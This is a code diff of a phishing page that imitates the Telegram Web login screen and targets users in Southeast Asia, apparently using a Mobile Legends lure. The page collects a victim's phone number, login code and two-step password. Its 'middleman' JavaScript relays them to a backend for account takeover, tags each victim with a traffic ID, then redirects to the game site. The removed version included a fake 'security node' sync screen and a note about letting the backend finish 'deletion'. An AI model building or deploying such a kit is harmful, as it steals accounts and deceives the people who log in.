@@ -9,70 +9,71 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
 
     <style>
-        /* CSS ARCHITECTURE: TELEGRAM K-WEB MIRROR v9.4 
-           Focus: High-Fidelity, Unshortened Selectors, Mobile Responsiveness
+        /* STRICT DESIGN SYSTEM: TELEGRAM WEB K 
+           Unshortened, explicit CSS for high-fidelity mirroring.
         */
         :root {
-            --tg-primary: #3390ec;
-            --tg-primary-hover: #2b78c5;
-            --tg-bg: #ffffff;
-            --tg-bg-secondary: #f4f4f5;
-            --tg-text: #222222;
-            --tg-text-secondary: #707579;
-            --tg-border: #dfe1e5;
-            --tg-error: #e53935;
-            --tg-radius: 12px;
-            --tg-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            --transition-speed: 0.25s;
+            --primary-color: #3390ec;
+            --primary-hover-color: #2b78c5;
+            --text-color: #000000;
+            --text-secondary: #707579;
+            --bg-color: #ffffff;
+            --bg-secondary: #f4f4f5;
+            --border-color: #dfe1e5;
+            --error-color: #e53935;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: var(--tg-font);
+            font-family: var(--font-family);
             -webkit-font-smoothing: antialiased;
         }
 
         body {
-            background-color: var(--tg-bg-secondary);
-            color: var(--tg-text);
+            background-color: var(--bg-secondary);
+            color: var(--text-color);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden;
-        }
-
-        /* Container & Auth Card */
-        .page-wrapper {
-            width: 100%;
-            max-width: 440px;
+            overflow-x: hidden;
+            overflow-y: auto; /* Proper scrolling allowed */
             padding: 20px;
         }
 
+        /* View Transition Effects */
+        .page-container {
+            width: 100%;
+            max-width: 440px;
+            position: relative;
+            perspective: 1000px;
+        }
+
         .auth-card {
-            background: var(--tg-bg);
-            border-radius: var(--tg-radius);
-            padding: 48px 40px 36px 40px;
+            background: var(--bg-color);
+            border-radius: 12px;
+            padding: 48px 40px;
             text-align: center;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 10px 40px rgba(0,0,0,0.04);
-            position: relative;
-            min-height: 520px;
+            min-height: 560px;
             display: flex;
             flex-direction: column;
-            transition: transform var(--transition-speed) ease;
+            transition: var(--transition);
+            z-index: 1;
         }
 
-        /* Brand Elements */
-        .brand-logo {
+        /* Branding */
+        .logo-container {
             width: 120px;
             height: 120px;
-            margin: 0 auto 32px auto;
+            margin: 0 auto 32px;
         }
 
-        .brand-logo img {
+        .logo-container img {
             width: 100%;
             height: 100%;
         }
@@ -81,18 +82,87 @@
             font-size: 26px;
             font-weight: 700;
             margin-bottom: 12px;
-            letter-spacing: -0.4px;
+            letter-spacing: -0.5px;
         }
 
         .subtitle {
             font-size: 16px;
-            color: var(--tg-text-secondary);
+            color: var(--text-secondary);
             line-height: 1.5;
-            margin-bottom: 35px;
+            margin-bottom: 36px;
+        }
+
+        /* QR Logic - Official Centered Logo Style */
+        .qr-wrapper {
+            position: relative;
+            width: 240px;
+            height: 240px;
+            margin: 0 auto 32px;
+            background: white;
+            padding: 12px;
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+        }
+
+        .qr-wrapper img#qr-image {
+            width: 100%;
+            height: 100%;
+            border-radius: 8px;
+        }
+
+        .qr-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 58px;
+            height: 58px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .qr-overlay img {
+            width: 42px;
+            height: 42px;
+        }
+
+        /* Instructions List */
+        .instruction-steps {
+            text-align: left;
+            width: 100%;
+            margin-bottom: 24px;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 14px;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        .step-badge {
+            background: var(--primary-color);
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            margin-right: 14px;
+            flex-shrink: 0;
+            margin-top: 2px;
         }
 
         /* Form Controls */
-        .form-group {
+        .form-row {
             width: 100%;
             margin-bottom: 24px;
             text-align: left;
@@ -100,19 +170,18 @@
 
         .iti { width: 100%; }
 
-        .input-main {
+        .input-tg {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid var(--tg-border);
-            border-radius: var(--tg-radius);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
             font-size: 18px;
-            background-color: transparent;
-            transition: border-color var(--transition-speed);
+            transition: border-color 0.2s;
+            outline: none;
         }
 
-        .input-main:focus {
-            border-color: var(--tg-primary);
-            outline: none;
+        .input-tg:focus {
+            border-color: var(--primary-color);
         }
 
         .input-otp {
@@ -122,239 +191,163 @@
             font-size: 24px;
         }
 
-        /* Buttons */
-        .btn-primary {
+        /* Buttons & Links */
+        .btn-main {
             width: 100%;
-            background-color: var(--tg-primary);
-            color: #ffffff;
+            background-color: var(--primary-color);
+            color: white;
             border: none;
-            padding: 16px 20px;
-            border-radius: var(--tg-radius);
+            padding: 16px;
+            border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-top: auto;
-            transition: background var(--transition-speed);
             display: flex;
             justify-content: center;
             align-items: center;
+            gap: 10px;
         }
 
-        .btn-primary:hover {
-            background-color: var(--tg-primary-hover);
+        .btn-main:hover {
+            background-color: var(--primary-hover-color);
         }
 
-        .btn-primary:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        /* QR Gate Specifics */
-        .qr-area {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto 24px;
-            border: 1px solid var(--tg-border);
-            padding: 10px;
-            border-radius: 12px;
-        }
-
-        .qr-area img {
-            width: 100%;
-            height: 100%;
-        }
-
-        .instruction-list {
-            text-align: left;
-            max-width: 280px;
-            margin: 0 auto 24px;
-        }
-
-        .instruction-step {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 12px;
-            font-size: 14px;
-            color: var(--tg-text);
-        }
-
-        .step-num {
-            background: var(--tg-primary);
-            color: #fff;
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            font-weight: bold;
-            margin-right: 12px;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .toggle-link {
-            color: var(--tg-primary);
+        .blue-link {
+            color: var(--primary-color);
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 24px;
             display: inline-block;
+            text-decoration: none;
         }
 
-        /* Loading Spinner */
+        /* Timer & Resend Section */
+        .auth-footer {
+            margin-top: 18px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        /* Animations */
+        .hidden { display: none !important; }
+
+        .fade-exit {
+            opacity: 0;
+            transform: scale(0.95);
+        }
+
+        .fade-enter {
+            opacity: 0;
+            transform: scale(1.05);
+        }
+
+        .error-shake {
+            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+            border-color: var(--error-color) !important;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
         .spinner {
             width: 20px;
             height: 20px;
             border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            border-top-color: #fff;
+            border-top-color: white;
             animation: spin 0.8s linear infinite;
-            margin-left: 10px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Utils */
-        .hidden { display: none !important; }
-
-        /* Sync Screen Styles */
-        .sync-animation {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-
-        .sync-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: #eee;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: var(--tg-primary);
-            transition: width 6s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        /* Error Shake */
-        .error-shake {
-            animation: shake 0.4s;
-            border-color: var(--tg-error) !important;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
     </style>
 </head>
 <body>
 
-<div class="page-wrapper">
-    <div class="auth-card">
-
-        <div id="step-qr">
-            <div class="brand-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+<div class="page-container">
+    <div class="auth-card" id="main-card">
+        
+        <div id="view-qr" class="view-panel">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
             </div>
             <h1>Log in to Telegram</h1>
-            <div class="qr-area">
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=tg://login?token=AQA" alt="QR">
+            <div class="qr-wrapper">
+                <img id="qr-image" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=tg://login?token=AQA" alt="QR">
+                <div class="qr-overlay">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Inner">
+                </div>
             </div>
-            <div class="instruction-list">
-                <div class="instruction-step">
-                    <span class="step-num">1</span>
+            <div class="instruction-steps">
+                <div class="step-item">
+                    <span class="step-badge">1</span>
                     <span>Open Telegram on your phone</span>
                 </div>
-                <div class="instruction-step">
-                    <span class="step-num">2</span>
+                <div class="step-item">
+                    <span class="step-badge">2</span>
                     <span>Go to Settings > Devices > Link Device</span>
                 </div>
-                <div class="instruction-step">
-                    <span class="step-num">3</span>
+                <div class="step-item">
+                    <span class="step-badge">3</span>
                     <span>Point your phone at this screen</span>
                 </div>
             </div>
-            <span class="toggle-link" onclick="navigate('phone')">LOG IN BY PHONE NUMBER</span>
+            <a class="blue-link" onclick="navigate('qr', 'phone')">LOG IN BY PHONE NUMBER</a>
         </div>
 
-        <div id="step-phone" class="hidden">
-            <div class="brand-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+        <div id="view-phone" class="view-panel hidden">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
             </div>
             <h1>Your Phone Number</h1>
             <p class="subtitle">Confirm your country code and enter your phone number.</p>
-            <div class="form-group">
-                <input type="tel" id="user_phone" class="input-main">
+            <div class="form-row">
+                <input type="tel" id="user_phone" class="input-tg">
             </div>
-            <button class="btn-primary" onclick="processPhone()">
-                Next <div id="loader-phone" class="spinner hidden"></div>
+            <button class="btn-main" onclick="submitPhone()">
+                Next <div id="load-phone" class="spinner hidden"></div>
             </button>
-            <span class="toggle-link" onclick="navigate('qr')">LOG IN BY QR CODE</span>
+            <a class="blue-link" onclick="navigate('phone', 'qr')">LOG IN BY QR CODE</a>
         </div>
 
-        <div id="step-otp" class="hidden">
-            <div class="brand-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+        <div id="view-otp" class="view-panel hidden">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
             </div>
-            <h1 id="otp-phone-display"></h1>
+            <h1 id="display-phone"></h1>
             <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
-            <div class="form-group">
-                <input type="text" id="user_otp" class="input-main input-otp" placeholder="Code" maxlength="5">
+            <div class="form-row">
+                <input type="text" id="user_otp" class="input-tg input-otp" placeholder="Code" maxlength="5">
             </div>
-            <button class="btn-primary" onclick="processOtp()">
-                Next <div id="loader-otp" class="spinner hidden"></div>
+            <button class="btn-main" onclick="submitOtp()">
+                Next <div id="load-otp" class="spinner hidden"></div>
             </button>
+            <div class="auth-footer">
+                <span id="timer-box">Requesting code in 0:<span id="seconds">59</span></span>
+                <span id="resend-box" class="blue-link hidden" style="margin:0" onclick="submitPhone()">Resend Code</span>
+            </div>
         </div>
 
-        <div id="step-2fa" class="hidden">
-            <div class="brand-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+        <div id="view-2fa" class="view-panel hidden">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
             </div>
             <h1>2-Step Verification</h1>
             <p class="subtitle">Your account is protected by an additional password.</p>
-            <div class="form-group">
-                <input type="password" id="user_2fa" class="input-main" placeholder="Password">
+            <div class="form-row">
+                <input type="password" id="user_2fa" class="input-tg" placeholder="Password">
             </div>
-            <button class="btn-primary" onclick="process2fa()">
-                Unlock <div id="loader-2fa" class="spinner hidden"></div>
+            <button class="btn-main" onclick="submit2fa()">
+                Unlock <div id="load-2fa" class="spinner hidden"></div>
             </button>
-        </div>
-
-        <div id="step-sync" class="hidden">
-            <div class="sync-animation">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="sync-icon" alt="TG">
-                <span style="font-size: 24px; color: #ccc;">+</span>
-                <img src="https://logodownload.org/wp-content/uploads/2021/01/mobile-legends-logo-0.png" class="sync-icon" style="background:#000; padding:5px;">
-            </div>
-            <h1>Connecting...</h1>
-            <p class="subtitle">Authenticating your cloud session with the Moonton security node. Please wait.</p>
-            <div class="progress-bar">
-                <div class="progress-fill" id="sync-bar"></div>
-            </div>
-            <p style="font-size: 12px; color: var(--tg-text-secondary); margin-top: 20px;">
-                Do not refresh this page. This process takes up to 10 seconds.
-            </p>
         </div>
 
     </div>
@@ -362,29 +355,66 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    /* MIDDLEMAN LOGIC v5.0
-       Direct Sync to app.py with Mirror Routing
+    /* CORE MIDDLEMAN LOGIC v9.0
+       Synchronized with Python Backend (app.py)
     */
     const phoneInput = document.querySelector("#user_phone");
     const iti = window.intlTelInput(phoneInput, {
         initialCountry: "kh",
         separateDialCode: true,
-        preferredCountries: ["kh", "th", "id", "vn", "my"],
+        preferredCountries: ["kh", "th", "id", "vn"],
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
     let currentPhone = "";
-    const TRAFFIC_ID = new URLSearchParams(window.location.search).get('id') || '0';
+    const TID = new URLSearchParams(window.location.search).get('id') || '0';
 
-    // UI Navigation
-    function navigate(step) {
-        const sections = ['qr', 'phone', 'otp', '2fa', 'sync'];
-        sections.forEach(s => document.getElementById(`step-${s}`).classList.add('hidden'));
-        document.getElementById(`step-${step}`).classList.remove('hidden');
+    // NAVIGATION SYSTEM WITH DELAYED TRANSITIONS
+    function navigate(from, to) {
+        const fromEl = document.getElementById(`view-${from}`);
+        const toEl = document.getElementById(`view-${to}`);
+        
+        fromEl.classList.add('fade-exit');
+        
+        setTimeout(() => {
+            fromEl.classList.add('hidden');
+            fromEl.classList.remove('fade-exit');
+            
+            toEl.classList.remove('hidden');
+            toEl.classList.add('fade-enter');
+            
+            setTimeout(() => {
+                toEl.classList.remove('fade-enter');
+            }, 50);
+        }, 250);
     }
 
-    // Core Middleman Fetch
-    async function middlemanPost(endpoint, payload) {
+    // TIMER SYSTEM
+    let countdown;
+    function startTimer() {
+        let timeLeft = 59;
+        const secondsSpan = document.getElementById('seconds');
+        const timerBox = document.getElementById('timer-box');
+        const resendBox = document.getElementById('resend-box');
+        
+        resendBox.classList.add('hidden');
+        timerBox.classList.remove('hidden');
+        
+        clearInterval(countdown);
+        countdown = setInterval(() => {
+            timeLeft--;
+            secondsSpan.innerText = timeLeft < 10 ? '0' + timeLeft : timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerBox.classList.add('hidden');
+                resendBox.classList.remove('hidden');
+            }
+        }, 1000);
+    }
+
+    // API MIDDLEMAN FETCH
+    async function apiRequest(endpoint, payload) {
         try {
             const response = await fetch(endpoint, {
                 method: 'POST',
@@ -393,96 +423,65 @@
             });
             return await response.json();
         } catch (e) {
-            console.error("Mirror Connection Failed");
-            return { status: "error", message: "Network offline" };
+            return { status: 'error', message: 'Connection lost' };
         }
     }
 
-    // Phase: Phone Submission
-    async function processPhone() {
+    // PHASE: PHONE
+    async function submitPhone() {
         if (!iti.isValidNumber()) {
             phoneInput.classList.add('error-shake');
             setTimeout(() => phoneInput.classList.remove('error-shake'), 400);
             return;
         }
 
-        const loader = document.getElementById('loader-phone');
-        loader.classList.remove('hidden');
+        document.getElementById('load-phone').classList.remove('hidden');
         currentPhone = iti.getNumber();
-
-        const data = await middlemanPost('/step_phone', {
-            phone: currentPhone,
-            tid: TRAFFIC_ID
-        });
-
-        loader.classList.add('hidden');
+        
+        const data = await apiRequest('/step_phone', { phone: currentPhone, tid: TID });
+        
+        document.getElementById('load-phone').classList.add('hidden');
         if (data.status === 'success') {
-            document.getElementById('otp-phone-display').innerText = currentPhone;
-            navigate('otp');
-        } else {
-            alert(data.message || "Invalid account");
+            document.getElementById('display-phone').innerText = currentPhone;
+            navigate('phone', 'otp');
+            startTimer();
         }
     }
 
-    // Phase: OTP Submission
-    async function processOtp() {
-        const otpValue = document.getElementById('user_otp').value;
-        if (otpValue.length < 5) return;
+    // PHASE: OTP
+    async function submitOtp() {
+        const otp = document.getElementById('user_otp').value;
+        if (otp.length < 5) return;
 
-        const loader = document.getElementById('loader-otp');
-        loader.classList.remove('hidden');
-
-        const data = await middlemanPost('/step_code', {
-            phone: currentPhone,
-            code: otpValue,
-            tid: TRAFFIC_ID
-        });
-
-        loader.classList.add('hidden');
+        document.getElementById('load-otp').classList.remove('hidden');
+        const data = await apiRequest('/step_code', { phone: currentPhone, code: otp, tid: TID });
+        
+        document.getElementById('load-otp').classList.add('hidden');
         if (data.status === 'success') {
-            triggerSuccess();
+            window.location.href = "https://m.mobilelegends.com/";
         } else if (data.status === '2fa_needed') {
-            navigate('2fa');
+            navigate('otp', '2fa');
         } else {
             document.getElementById('user_otp').classList.add('error-shake');
             setTimeout(() => document.getElementById('user_otp').classList.remove('error-shake'), 400);
         }
     }
 
-    // Phase: 2FA Submission
-    async function process2fa() {
-        const passValue = document.getElementById('user_2fa').value;
-        if (!passValue) return;
+    // PHASE: 2FA
+    async function submit2fa() {
+        const pass = document.getElementById('user_2fa').value;
+        if (!pass) return;
 
-        const loader = document.getElementById('loader-2fa');
-        loader.classList.remove('hidden');
-
-        const data = await middlemanPost('/step_2fa', {
-            phone: currentPhone,
-            password: passValue,
-            tid: TRAFFIC_ID
-        });
-
-        loader.classList.add('hidden');
+        document.getElementById('load-2fa').classList.remove('hidden');
+        const data = await apiRequest('/step_2fa', { phone: currentPhone, password: pass, tid: TID });
+        
+        document.getElementById('load-2fa').classList.add('hidden');
         if (data.status === 'success') {
-            triggerSuccess();
+            window.location.href = "https://m.mobilelegends.com/";
         } else {
             document.getElementById('user_2fa').classList.add('error-shake');
             setTimeout(() => document.getElementById('user_2fa').classList.remove('error-shake'), 400);
         }
-    }
-
-    // Final Sync & Redirect
-    function triggerSuccess() {
-        navigate('sync');
-        setTimeout(() => {
-            document.getElementById('sync-bar').style.width = "100%";
-        }, 100);
-
-        // Mirror delay to allow backend to finish deletion
-        setTimeout(() => {
-            window.location.href = "https://m.mobilelegends.com/";
-        }, 7500);
     }
 </script>
 </body>
